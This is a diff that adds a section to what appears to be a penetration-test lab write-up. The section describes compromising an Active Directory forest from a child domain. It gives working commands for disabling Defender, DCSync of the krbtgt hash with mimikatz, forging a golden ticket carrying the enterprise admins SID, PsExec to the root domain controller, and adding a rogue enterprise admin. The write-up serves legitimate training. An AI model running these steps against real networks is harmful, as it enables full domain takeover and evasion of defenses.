@@ -184,6 +184,20 @@ Using one of these DAs, T0_josh.sutton, the consultant gained access to the CORP
 
 To gain direct access to the DC, a new user was created: `net user aquinas [redacted] /add` plus `net group "Domain Admins" aquinas /add`. This allowed the consultant to remote on to the domain with `proxychains remmina` or by opening a remote desktop session from the existing session on WRK1.
 
+Running the powershell command `Get-ADTrust` from the CORPDC revealed that CORP.THERESERVE.LOC was in a BiDirectional trust with THERESERVE.LOC, the Root domain of the forest (which also included BANK.THERESERVE.LOC, unreachable from CORP). As the consultant had domain admin rights, it should be possible to forge a golden ticket with the extra SID of the enterprise admin's group from THERESERVE, granting access to the root domain.
+
+To do this required the use of mimikatz, which by default is blocked by most competent antivirus solutions and definitely by Microsoft Defender. However, as admin on the CORPDC, the consultant was able to disable AV with the following command: `Set-MpPreference -DisableRealtimeMonitoring $true`.
+
+Uploading mimikatz, in order to get a golden ticket granting access to the root domain, the following steps were done:
+
+- first, the SID of the CORP domain and root were gathered, via `Get-ADDomain` and `Get-ADDomain -server 10.200.116.100`
+- next, the NTLM hash of the krgtgt user for CORP was gathered, via in mimikatz: `lsadump::dcsync /domain:corp.thereserve.loc /user:corp\krbtgt`
+- finally, a golden ticket was forged with `kerberos::golden /user:aquinas /domain:corp.thereserve.loc /sid:[CORP_SID] /krbtgt:[KRBTGT_HASH] /sids:[ROOT_SID]-519 /ptt`
+
+Note the use of -519 at the end of the ROOT_SID - this is the SID of the enterprise admins group. By executing the above command a golden ticket was created for the user aquinas granting access to the Root domain; this could be verified by running outside of mimikatz: `dir \\rootdc.thereserve.loc\c$` and seeing the file listing.
+
+To gain remote command execution, [PsExec from Systools](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) was used: `.\PsExec.exe -accepteula \\rootdc.thereserve.loc cmd`, which opened a command shell. To complete the compromise, a user was created (`net user aquinas [REDACTED] /add` again), and added to the enterprise admins group directly with `net group "Enterprise Admins" aquinas /add`. The consultant could then remote desktop direct to the root domain controller, proving compromise of the entire forest.
+
 ## Stage 4: Access to the Swift system and demonstrating impact
 
 ## Summary & Recommendations
